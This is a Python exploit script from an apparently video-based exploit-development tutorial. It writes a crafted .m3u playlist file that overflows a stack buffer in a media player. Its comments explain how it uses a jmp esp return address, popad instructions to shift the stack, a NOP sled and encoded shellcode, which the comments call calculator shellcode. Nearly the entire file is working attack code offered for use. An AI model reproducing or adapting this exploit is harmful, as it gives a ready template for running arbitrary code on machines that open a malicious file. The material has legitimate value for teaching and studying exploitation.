import struct

#in this method we use 'popad instruction'
#popad will pop 32bytes from stack and puts in
#	Pop EDI, ESI, EBP, EBX, EDX, ECX, and EAX
# repectively

#so we fill esp with some say 13X's , assume we have only this space
#and remaining we fill with D's and some junk 
#at after some number of A's we have our shellcode at lower position of stack

#we put 320 A's and 50 nops and shellcode
#so this is similar to small buffer problem but we use popad instruction 
#we need to skip our D's and A's and we should jump to shellcode


#opcode for popad is 0x61
#there are 234 A's , you can count or just subtract those first and last
#addresses of A's after D's 
#we got 234 A's between D's and our shellcode
#total 100D's + 234 A's we need to skip using 13bytes
#we need to skip 334 bytes to get our shellcode
# 32 *11 will skip more than those
#no problem 
#then we keep nops and shellcode :) 
#\x61 * 10

junk='A'*320
junk=junk.encode('raw_unicode_escape')

nops1='\x90'*50
nops1=nops1.encode('raw_unicode_escape')

shellcode=("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")



shellcode=shellcode.encode('raw_unicode_escape')

remainingbuffer='A'*(26064-len(junk)-len(nops1)-len(shellcode))
remainingbuffer=remainingbuffer.encode('raw_unicode_escape')

buffer1=junk+nops1+shellcode+remainingbuffer

#we point eip to esp by jmp esp
#becoz we need to execute the popad instruction that we kept on stack
eip=struct.pack('<I',0x7C8369F0)
#i am sorry i didnot comment below line
#eip='B'*4
#so now eip points to esp

#eip=eip.encode('raw_unicode_escape')

beforeesp='C'*4
beforeesp=beforeesp.encode('raw_unicode_escape')

#esp='X'*13
#popad
esp='\x61'*11
#jmp esp
esp+='\xff\xe4'
esp=esp.encode('raw_unicode_escape')

lastjunk='D'*100
lastjunk=lastjunk.encode('raw_unicode_escape')

#we will skip D's and A's and we encounter xcc which is break point
#lets check
#we got int 03 which is break point  
#lets replace with our calculator shellcode
#you can place yours

overflow=buffer1+eip+beforeesp+esp+lastjunk

#writing to file
f=open("C:\\Users\\nikki\\Desktop\\exploit_development_python\\popad.m3u","wb")

f.write(overflow)

f.close()

print("file created successfully")

#successful :)

#THANKS FOR WATCHING
#SUBSCRIBE FOR MORE TUTORIALS




